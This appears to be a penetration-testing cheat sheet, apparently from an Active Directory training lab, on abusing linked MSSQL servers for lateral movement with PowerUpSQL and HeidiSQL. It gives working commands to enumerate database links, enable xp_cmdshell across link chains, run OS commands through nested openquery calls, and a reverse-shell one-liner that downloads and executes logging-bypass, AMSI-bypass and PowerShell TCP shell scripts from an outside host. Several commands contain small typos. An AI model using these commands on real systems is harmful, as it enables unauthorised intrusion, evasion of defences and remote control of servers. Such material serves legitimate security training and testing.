- SQL Servers provide very good options for _lateral movement_ as domain users can be mapped to database roles.
- For MSSQL and PowerShell hackery, lets use [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
- HeidiSQL is a GUI Tool

#### Enumeration
- Discovery (SPN Scanning)
```powershell
Get-SQLInstanceDomain
```

-  Check Accessibility
```powershell
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```
- Gather Information
```powershell
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

#### Database Links
- A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources.
- In case of database links between SQL servers, that is, linked SQL servers, it is possible to execute stored procedures.
- _Database links work even across forest trusts._

__Enumerate DB Link__
```powershell
Get-SQLServerLink -instance dcorp-mssql -Verbose
```

__Enumerating Database Links - Recursively__
```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
```

__Enable xp_cmdshell__ [HackTricks - mssql Abuse](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/abusing-ad-mssql)
- Use the -QuertyTarget parameter to run Query on a specific instance (without -QueryTarget the command tries to use xp_cmdshell on every link of the chain)
```sql
Get-SQLServerLinkCrawl -instance "dcorp-mssql" -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',0;reconfigure;'') AT "eu-sql6"'
```

```powershell
 Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "EXEC sp_configure 'xp_cmdshell',0;reconfigure;)" -QueryTarget eu-sql6
```

```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'cmd /c set username'" -QueryTarget eu-sql
```

__Reverse Shell__
```powershell
Get-SQLServerLinkCrawl -instance "dcorp-mssql" -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -usebasicparsing http://172.16.30.100/sbloggingbypass.txt);iex (iwr -usebasicparsing http://172.16.30.100/amsibypass.txt);iex (iwr -usebasicparsing http://172.16.30.100/Invoke-PowerShellTcpEx.ps1"''' -QueryTarget eu-sql6
```

#### Manually - HeidiSQL

__Get SQL Servers__ Access Linked DB if `is_data_access_enabled: true`__
```sql
select * from master..sysservers
```

__Enumerating Database Links - Manually__
- Openquery() function can be used to run queries on a linked DB (dcorp-sql1)
```sql
select * from openquery("dcorp-sql1",'select * from master..sysservers')
```

__Execute Commands__
- On the target server, either xp_cmdshell should be already enabled; or
- If rpcout is enabled (disabled by default), xp_cmdshell can be enabled using:
```SQL
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"
```

- From the initial SQL server, OS commands can be executed using nested link queries:
```sql
select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')') 
```



